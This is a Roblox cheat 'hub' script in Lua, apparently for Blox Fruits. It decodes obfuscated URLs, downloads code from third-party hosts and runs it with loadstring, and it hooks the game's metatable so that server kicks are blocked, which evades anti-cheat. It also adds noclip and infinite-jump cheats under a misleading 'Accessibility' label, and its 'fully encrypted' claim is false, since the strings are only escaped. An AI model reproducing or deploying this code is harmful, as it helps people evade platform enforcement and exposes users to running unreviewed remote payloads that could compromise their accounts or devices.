-- [[ 🦖 T-REX X HUB | VERSION 1.0 βᴇᴛᴀ ]] --
-- [[ 🛡️ STATUS: NO KEY | FULLY ENCRYPTED ]] --

-- [ 🔐 INTERNAL DATABASE ]
local _0x536F75726365 = {
    [1] = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\70\111\111\116\97\103\101\115\117\115\47\87\105\110\100\85\73\47\114\101\108\101\97\115\101\115\47\108\97\116\101\115\116\47\108\111\97\100\101\114\46\108\117\97", -- UI
    [2] = "\104\116\116\112\115\58\47\47\114\105\115\101\45\101\118\111\46\120\121\122\47\97\112\118\51\47\109\97\105\110\46\108\117\97", -- Rise
    [3] = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\104\105\116\101\88\49\50\48\56\47\83\99\114\105\112\116\115\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\66\70\45\66\101\116\97\46\108\117\97", -- WhiteX
    [4] = "\104\116\116\112\115\58\47\47\72\52\120\83\99\114\105\112\116\115\46\120\121\122\47\108\111\97\100\101\114" -- H4x
}

local function _0xRun(_0xId) 
    return loadstring(game:HttpGet(_0x536F75726365[_0xId]))() 
end

-- [ 🛡️ BYPASS SYSTEM ]
local _0xProt = function()
    local mt = getrawmetatable(game); setreadonly(mt, false); local old = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if not checkcaller() and getnamecallmethod() == "Kick" then return nil end
        return old(self, ...)
    end); setreadonly(mt, true)
end
pcall(_0xProt)

-- [ 🦖 MAIN UI ]
local WindUI = _0xRun(1)
local Window = WindUI:CreateWindow({
    Title = "T-rex X v1 βᴇᴛᴀ 🦖",
    Icon = "solar:shield-check-bold",
    Size = UDim2.fromOffset(580, 460)
})

-- Tabs
local TabMain = Window:Tab({ Title = "Games", Icon = "solar:gamepad-bold" })
local TabUtil = Window:Tab({ Title = "Accessibility", Icon = "solar:accessibility-bold" })

-- Blox Fruit Buttons
TabMain:Button({ Title = "Rise Hub [No Key]", Callback = function() _0xRun(2) end })
TabMain:Button({ Title = "WhiteX Beta", Callback = function() _0xRun(3) end })
TabMain:Button({ Title = "H4x Loader", Callback = function() _0xRun(4) end })

-- Accessibility Features
TabUtil:Toggle({Title = "Noclip", Callback = function(s) _G.Noclip = s end})
TabUtil:Toggle({Title = "Infinite Jump", Callback = function(s) _G.InfJump = s end})

-- Movement Loop
game:GetService("RunService").Stepped:Connect(function()
    if _G.Noclip and game.Players.LocalPlayer.Character then
        for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = false end
        end
    end
end)

game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.InfJump and game.Players.LocalPlayer.Character then
        local h = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if h then h:ChangeState(3) end
    end
end)

TabUtil:Button({ Title = "Destroy Script", Color = Color3.fromHex("#FF4B4B"), Callback = function() Window:Destroy() end })

WindUI:Notify({Title = "T-Rex X", Content = "Script Loaded Successfully!", Duration = 3})
